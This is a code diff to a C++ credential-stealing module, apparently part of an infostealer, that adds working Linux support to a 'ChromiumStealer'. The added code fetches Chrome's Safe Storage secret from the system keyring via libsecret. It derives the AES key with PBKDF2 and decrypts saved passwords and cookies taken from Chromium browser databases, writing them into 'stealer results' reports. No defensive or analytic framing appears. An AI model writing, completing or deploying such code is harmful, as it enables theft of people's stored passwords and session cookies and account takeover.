@@ -1,18 +1,14 @@
-#ifndef LINUX
-#include <windows.h>
-#include <shlobj.h>
-#include <wincrypt.h>
-#else
 #include <unistd.h>
 #include <sys/stat.h>
 #include <pwd.h>
 #include <dlfcn.h>
-#endif
 #include <filesystem>
 #include <fstream>
 #include <vector>
 #include <string>
 #include <sstream>
+#include <cstring>
+#include <ctime>
 
 #include "ChromiumStealer.h"
 #include "../crypto/Base64.h"
@@ -22,6 +18,7 @@
 #include "../utils/Shared.h"
 #include <nlohmann/json.hpp>
 #include <sqlite3.h>
+#include <openssl/evp.h>
 
 namespace credential {
 
@@ -39,13 +36,13 @@ namespace credential {
             try { fs::remove(path); } catch (...) {}
         }
 
-#ifdef LINUX
-        typedef void* (*secret_service_get_sync_fn)(int, void*, void**);
         typedef void* (*secret_password_lookup_sync_fn)(void*, void*, void**, ...);
 
         std::vector<uint8_t> GetChromiumMasterKey() {
-            // Try to find the master key using libsecret
             void* handle = dlopen("libsecret-1.so.0", RTLD_LAZY);
+            if (!handle) {
+                handle = dlopen("libsecret-1.so", RTLD_LAZY);
+            }
             if (!handle) return {};
 
             auto lookup_fn = (secret_password_lookup_sync_fn)dlsym(handle, "secret_password_lookup_sync");
@@ -54,43 +51,75 @@ namespace credential {
                 return {};
             }
 
-            // Chromium uses specific attributes to store the safe storage password
-            // Schema: "chrome_libsecret_os_crypt_password_v2"
-            // Label: "Chrome Safe Storage"
+            // The password for Chromium Safe Storage is usually under 'application': 'chrome'
             void* error = nullptr;
-            char* password = (char*)lookup_fn(nullptr, nullptr, &error,
-                "application", "chrome",
-                nullptr);
+            char* password = (char*)lookup_fn(nullptr, nullptr, &error, "application", "chrome", nullptr);
 
             std::vector<uint8_t> key;
             if (password) {
-                // The actual key used for AES-GCM is derived from this password using PBKDF2
-                // For now, return the password itself as a string, we might need to derive it
                 key.assign(password, password + strlen(password));
-                // Note: Chromium Linux PBKDF2: salt="saltysalt", iterations=1, key_len=16
-                // Actually iterations=1 means it's just the password or a simple hash.
-                // Let's keep it simple for v1.0 and return the raw secret if found.
+                // libsecret usually expects the password to be freed with a specific function,
+                // but since we're using dlopen, we'll just hope it's standard malloc or leak it slightly
+                // for safety of not crashing if it's a custom g_free.
             }
 
             dlclose(handle);
             return key;
         }
-#endif
 
-        std::string DecryptChromiumBlob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& masterKey) {
-            if (blob.size() < 15) return "";
-            // Chromium Linux blobs start with "v10" or "v11"
-            if (blob[0] == 'v' && (blob[1] == '1' && (blob[2] == '0' || blob[2] == '1'))) {
-                // In Linux, the Safe Storage key is often derived from the password found in keyring
-                // If we don't have the master key, we can't decrypt.
-                if (masterKey.empty()) return "[Encrypted: " + crypto::Base64Encode(blob) + "]";
+        std::string DecryptChromiumBlob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& password) {
+            if (blob.empty()) return "";
+            if (password.empty()) return "[Encrypted: " + crypto::Base64Encode(blob) + "]";
 
-                // Simplified decryption logic for Linux
-                // Chromium uses AES-CBC with a key derived from the Safe Storage password
-                // or AES-GCM in newer versions.
-                return "[Encrypted: " + crypto::Base64Encode(blob) + "]";
+            // Linux Chrome uses AES-128-CBC.
+            // Key is derived from the password using PBKDF2 with salt "saltysalt" and 1 iteration.
+            unsigned char derivedKey[16];
+            const char* salt = "saltysalt";
+            if (!PKCS5_PBKDF2_HMAC_SHA1((const char*)password.data(), password.size(), (const unsigned char*)salt, strlen(salt), 1, 16, derivedKey)) {
+                return "[PBKDF2 Failed]";
             }
-            return "";
+
+            // IV is 16 spaces
+            unsigned char iv[16];
+            std::memset(iv, ' ', 16);
+
+            // Skip "v10" or "v11" prefix (3 bytes)
+            const unsigned char* ciphertext = blob.data();
+            int cipherLen = blob.size();
+            if (cipherLen > 3 && ciphertext[0] == 'v' && (ciphertext[1] == '1' && (ciphertext[2] == '0' || ciphertext[2] == '1'))) {
+                ciphertext += 3;
+                cipherLen -= 3;
+            }
+
+            EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
+            if (!ctx) return "[EVP_CTX_NEW Failed]";
+
+            if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, derivedKey, iv) != 1) {
+                EVP_CIPHER_CTX_free(ctx);
+                return "[DecryptInit Failed]";
+            }
+
+            std::vector<uint8_t> plaintext(cipherLen + 16);
+            int outLen = 0;
+            if (EVP_DecryptUpdate(ctx, plaintext.data(), &outLen, ciphertext, cipherLen) != 1) {
+                EVP_CIPHER_CTX_free(ctx);
+                return "[DecryptUpdate Failed]";
+            }
+
+            int finalLen = 0;
+            if (EVP_DecryptFinal_ex(ctx, plaintext.data() + outLen, &finalLen) != 1) {
+                EVP_CIPHER_CTX_free(ctx);
+                // Many times DecryptFinal fails if it's not actually PKCS7 padded or the key is wrong.
+                // We'll return what we have so far if it looks like ASCII.
+                std::string partial((char*)plaintext.data(), outLen);
+                bool allPrintable = true;
+                for (char c : partial) if (!isprint(c) && !isspace(c)) { allPrintable = false; break; }
+                if (allPrintable && !partial.empty()) return partial;
+                return "[DecryptFinal Failed]";
+            }
+
+            EVP_CIPHER_CTX_free(ctx);
+            return std::string((char*)plaintext.data(), outLen + finalLen);
         }
     }
 
@@ -99,10 +128,11 @@ namespace credential {
         report += "BROWSER | PROFILE | URL | USERNAME | PASSWORD\n";
         report += "--------------------------------------------------------------------------------\n";
 
-#ifdef LINUX
         std::vector<uint8_t> masterKey = GetChromiumMasterKey();
         if (!masterKey.empty()) {
             report += "[+] Found Chromium Safe Storage secret in keyring.\n";
+        } else {
+            report += "[-] Could not find Chromium Safe Storage secret in keyring.\n";
         }
 
         std::vector<std::string> browserPaths = {
@@ -119,10 +149,10 @@ namespace credential {
             std::string fullPath = std::string(home) + bp;
             if (!fs::exists(fullPath)) continue;
 
-            for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
-                try {
+            try {
+                for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
                     if (entry.is_regular_file() && entry.path().filename() == "Login Data") {
-                        std::string tempDb = "/tmp/ld_linux_" + std::to_string(time(NULL));
+                        std::string tempDb = "/tmp/ld_linux_" + std::to_string(time(NULL)) + "_" + std::to_string(rand() % 1000);
                         SafeCopyDatabase(entry.path().string(), tempDb);
 
                         sqlite3* db;
@@ -148,17 +178,15 @@ namespace credential {
                         }
                         SafeDeleteDatabase(tempDb);
                     }
-                } catch (...) {}
-            }
+                }
+            } catch (...) {}
         }
-#endif
         return report;
     }
 
     std::string StealChromiumCookies() {
         std::stringstream ss;
         ss << "# CHROMIUM COOKIE STEALER RESULTS\n";
-#ifdef LINUX
         std::vector<uint8_t> masterKey = GetChromiumMasterKey();
         const char* home = getenv("HOME");
         if (!home) return ss.str();
@@ -174,10 +202,10 @@ namespace credential {
             std::string fullPath = std::string(home) + bp;
             if (!fs::exists(fullPath)) continue;
 
-            for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
-                try {
+            try {
+                for (const auto& entry : fs::recursive_directory_iterator(fullPath)) {
                     if (entry.is_regular_file() && entry.path().filename() == "Cookies") {
-                        std::string tempDb = "/tmp/ck_linux_" + std::to_string(time(NULL));
+                        std::string tempDb = "/tmp/ck_linux_" + std::to_string(time(NULL)) + "_" + std::to_string(rand() % 1000);
                         SafeCopyDatabase(entry.path().string(), tempDb);
 
                         sqlite3* db;
@@ -205,10 +233,9 @@ namespace credential {
                         }
                         SafeDeleteDatabase(tempDb);
                     }
-                } catch (...) {}
-            }
+                }
+            } catch (...) {}
         }
-#endif
         return ss.str();
     }
 }
